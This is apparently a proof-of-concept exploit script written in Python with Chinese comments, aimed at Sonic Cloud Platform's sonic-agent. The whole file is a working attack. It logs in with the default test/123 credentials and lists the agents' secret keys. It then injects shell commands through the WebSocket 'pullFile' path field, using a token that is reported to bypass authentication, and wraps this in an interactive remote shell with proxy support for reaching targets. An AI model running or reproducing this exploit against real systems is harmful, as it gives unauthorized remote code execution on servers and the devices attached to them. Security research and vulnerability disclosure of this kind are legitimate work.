#!/usr/bin/env python3
"""
Sonic Cloud Platform sonic-agent — pullFile 命令注入 RCE
交互式 Shell

用法:
    python poc1_pullfile.py -u http://192.168.1.100:3000
    python poc1_pullfile.py -u https://target.example.com:443
    python poc1_pullfile.py -u https://target.example.com:443 -x socks5://127.0.0.1:1080
    python poc1_pullfile.py          # 交互式输入 URL
"""

import argparse, json, queue, ssl, sys, threading, time
import requests, websocket, urllib3
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Windows GBK 终端兼容
if sys.stdout.encoding and sys.stdout.encoding.lower() != 'utf-8':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

ADB = "/root/platform-tools/adb"


# ── 参数 ────────────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(description="Sonic pullFile RCE — Interactive Shell")
    p.add_argument("-u", "--url",   help="目标地址, 如 http://192.168.1.1:3000 或 https://...")
    p.add_argument("-x", "--proxy", help="代理, 如 socks5://127.0.0.1:1080 或 http://127.0.0.1:8080",
                   default=None)
    a = p.parse_args()
    if not a.url:
        a.url = input("[?] Sonic Server 地址: ").strip()
    a.url = a.url.rstrip("/")
    return a


def _parse_proxy(proxy_str):
    """解析代理字符串，返回 requests proxies dict 和 websocket proxy 元组"""
    if not proxy_str:
        return None, (None, None, None)
    from urllib.parse import urlparse
    p = urlparse(proxy_str)
    scheme = p.scheme.lower()          # socks5 / socks4 / http
    host   = p.hostname
    port   = p.port
    requests_proxies = {"http": proxy_str, "https": proxy_str}
    # websocket-client 的代理参数
    ws_proxy = (host, port, scheme)    # (host, port, type)
    return requests_proxies, ws_proxy


# ── 登录 ────────────────────────────────────────────────────
def get_token(api, sess):
    r = sess.post(f"{api}/users/login",
                  json={"userName": "test", "password": "123"}, timeout=8)
    if r.json().get("code") == 2000:
        print("[+] 登录 test 账号成功")
        return r.json()["data"]
    print(f"[-] 登录失败: {r.json().get('message', r.text)}")
    sys.exit(1)


# ── 列出所有 Agent 及其设备，交互选择目标 ────────────────────
def select_target(api, sess, token):
    h = {"SonicToken": token}

    # 拉取所有 Agent
    agents = sess.get(f"{api}/agents/list", headers=h, timeout=8).json().get("data", [])
    if not agents:
        print("[-] 无可用 Agent"); sys.exit(1)

    # 拉取所有设备（最多 200 条）
    devs_all = (sess.get(f"{api}/devices/list?page=1&pageSize=200", headers=h, timeout=8)
                .json().get("data", {}).get("content", []))

    # 按 agentId 分组
    dev_map = defaultdict(list)
    for d in devs_all:
        dev_map[d.get("agentId")].append(d)

    # ── 打印列表 ──
    print(f"\n{'─'*58}")
    print(f"  发现 {len(agents)} 个 Agent，共 {len(devs_all)} 台设备")
    print(f"{'─'*58}")
    for i, ag in enumerate(agents):
        ag_online = "●" if ag.get("status") == "ONLINE" else "○"
        print(f"\n  [{i}] {ag_online} Agent#{ag['id']}  "
              f"{ag['host']}:{ag.get('port', 7777)}  "
              f"key={ag['secretKey']}")
        devs = dev_map.get(ag["id"], [])
        if devs:
            for j, d in enumerate(devs):
                st = d.get("status", "?")
                mark = "▶" if st in ("ONLINE", "DEBUGGING") else " "
                print(f"       {mark} [{j}] {d['udId']:<20} "
                      f"{d.get('model', '?'):<18} {st}")
        else:
            print(f"           (无关联设备)")
    print(f"\n{'─'*58}\n")

    # ── 选 Agent ──
    if len(agents) == 1:
        ag_idx = 0
        print(f"[*] 自动选择 Agent[0]: {agents[0]['host']}")
    else:
        try:
            ag_idx = int(input(f"选择 Agent [0-{len(agents)-1}]: ").strip())
        except ValueError:
            ag_idx = 0
    ag = agents[ag_idx]
    print(f"[+] 已选 Agent#{ag['id']}  {ag['host']}:{ag.get('port', 7777)}")

    # ── 选设备（仅显示该 Agent 下 ONLINE/DEBUGGING 的设备） ──
    devs = dev_map.get(ag["id"], [])
    avail = [d for d in devs if d.get("status") in ("ONLINE", "DEBUGGING")]

    if not avail:
        # agentId 字段不存在时退化为全局可用设备
        avail = [d for d in devs_all if d.get("status") in ("ONLINE", "DEBUGGING")]
    if not avail:
        print(f"[-] Agent#{ag['id']} 下无 ONLINE/DEBUGGING 设备"); sys.exit(1)

    if len(avail) == 1:
        dev_idx = 0
        print(f"[*] 自动选择设备[0]: {avail[0]['udId']}")
    else:
        print(f"\n  可用设备（Agent#{ag['id']} 下）:")
        for j, d in enumerate(avail):
            print(f"    [{j}] {d['udId']:<20} {d.get('model','?'):<18} {d.get('status')}")
        try:
            dev_idx = int(input(f"选择设备 [0-{len(avail)-1}]: ").strip())
        except ValueError:
            dev_idx = 0
    dev = avail[dev_idx]
    print(f"[+] 已选设备  udId={dev['udId']}  model={dev.get('model','?')}  "
          f"status={dev.get('status')}\n")

    return ag, dev


# ── 交互式 Shell ────────────────────────────────────────────
class SonicShell:
    def __init__(self, base_url, sess, h, ag, dev, ws_proxy=(None, None, None)):
        self.base     = base_url
        self.sess     = sess
        self.h        = h
        self.udid     = dev["udId"]
        # https → wss，http → ws
        ws_scheme     = "wss" if base_url.lower().startswith("https") else "ws"
        self.use_wss  = ws_scheme == "wss"
        self.ws_url   = (f"{ws_scheme}://{ag['host']}:{ag.get('port',7777)}"
                         f"/websockets/android/{ag['secretKey']}/{dev['udId']}/poc_token")
        self.ws_proxy = ws_proxy       # (host, port, type)  e.g. ("127.0.0.1", 1080, "socks5")
        self.mq        = queue.Queue()
        self.ws        = None
        self.ready     = threading.Event()
        self._conn_err = None   # 连接失败时存错误信息
        self._n        = 0

    # ── WS 回调 ──
    def _on_open(self, ws):
        self.ws = ws
        def _init():
            print("[*] 连接成功，等待 Agent 初始化（首次约 45s）...", flush=True)
            deadline = time.time() + 120
            while time.time() < deadline:
                time.sleep(1)
                got = self._drain()
                if got:
                    time.sleep(3)
                    self._drain()
                    break
            self.ready.set()
            print("[*] Agent 就绪，输入命令（exit 退出）\n")
        threading.Thread(target=_init, daemon=True).start()

    def _on_err(self, ws, e):
        self._conn_err = str(e)
        print(f"[err] {e}", flush=True)
        self.ready.set()   # 立即唤醒主线程，不等 130s

    def _on_close(self, ws, code, reason):
        print(f"[close] code={code} reason={reason}", flush=True)
        self.ready.set()   # 连接异常断开时也唤醒主线程

    def _on_msg(self, ws, m): self.mq.put(m)

    def _drain(self):
        msgs = []
        while not self.mq.empty():
            msgs.append(self.mq.get())
        return msgs

    def _send_wait(self, payload, wait):
        self._drain()
        self.ws.send(json.dumps(payload))
        time.sleep(wait)
        return self._drain()

    # ── 执行单条命令 ──
    def exec(self, cmd):
        self._n += 1
        tmp = f"/tmp/poc_{self._n}.txt"
        dev = f"/sdcard/poc_{self._n}.txt"

        # 步骤1：注入 — 在 Agent 上执行命令，写 /tmp，再 adb push 到设备
        inject = f"/nonexistent ; {cmd} > {tmp} 2>&1 ; {ADB} -s {self.udid} push {tmp} {dev} ;"
        self._send_wait({"type": "pullFile", "path": inject}, wait=18)

        # 步骤2：pullFile 从设备拉取并上传到 Server，得到下载 URL
        msgs = self._send_wait({"type": "pullFile", "path": dev}, wait=15)

        file_url = None
        for raw in msgs:
            try:
                d = json.loads(raw)
                if d.get("msg") == "pullResult" and d.get("status") == "success":
                    file_url = d.get("url", "")
                    break
            except Exception:
                pass

        if not file_url:
            return "(无回显，命令可能已执行但输出获取失败)"

        if not file_url.startswith("http"):
            file_url = f"{self.base}{file_url}"
        try:
            r = self.sess.get(file_url, headers=self.h, timeout=10)
            return r.text.strip()
        except Exception as e:
            return f"(下载失败: {e})"

    # ── 启动 ──
    def run(self):
        wa = websocket.WebSocketApp(
            self.ws_url,
            on_open    = self._on_open,
            on_message = self._on_msg,
            on_error   = self._on_err,
            on_close   = self._on_close,
        )
        run_kwargs = {}
        if self.use_wss:
            run_kwargs["sslopt"] = {"cert_reqs": ssl.CERT_NONE}
        proxy_host, proxy_port, proxy_type = self.ws_proxy
        if proxy_host:
            run_kwargs["http_proxy_host"] = proxy_host
            run_kwargs["http_proxy_port"] = proxy_port
            run_kwargs["proxy_type"] = proxy_type
            print(f"[*] WS 走代理: {proxy_type}://{proxy_host}:{proxy_port}")
        threading.Thread(target=wa.run_forever, kwargs=run_kwargs, daemon=True).start()

        if not self.ready.wait(timeout=130):
            print("[-] Agent 初始化超时"); sys.exit(1)

        # 连接失败（on_error 触发了 ready）
        if self._conn_err and self.ws is None:
            print(f"[-] 连接失败: {self._conn_err}")
            sys.exit(1)

        try:
            while True:
                try:
                    cmd = input("sonic-agent$ ").strip()
                except (EOFError, KeyboardInterrupt):
                    break
                if not cmd:
                    continue
                if cmd.lower() in ("exit", "quit", "q"):
                    break
                output = self.exec(cmd)
                print(output)
        finally:
            wa.close()
            print("\n[*] 会话已关闭")


# ── 入口 ────────────────────────────────────────────────────
def main():
    args = parse_args()
    api  = args.url + "/server/api/controller"

    print("=" * 60)
    print("  Sonic sonic-agent RCE — pullFile 注入交互式 Shell")
    print(f"  Target: {args.url}")
    print("=" * 60)

    req_proxies, ws_proxy = _parse_proxy(args.proxy)

    sess = requests.Session()
    sess.headers["Content-Type"] = "application/json"
    sess.verify = False
    if req_proxies:
        sess.proxies.update(req_proxies)
        print(f"[*] HTTP 走代理: {args.proxy}")

    token = get_token(api, sess)
    h     = {"SonicToken": token}
    ag, dev = select_target(api, sess, token)

    ws_scheme = "wss" if args.url.lower().startswith("https") else "ws"
    print(f"[+] WS: {ws_scheme}://{ag['host']}:{ag.get('port',7777)}"
          f"/websockets/android/{ag['secretKey']}/{dev['udId']}/poc_token")
    print("    (token 任意非空字符串绕过鉴权)\n")

    SonicShell(args.url, sess, h, ag, dev, ws_proxy=ws_proxy).run()


if __name__ == "__main__":
    main()
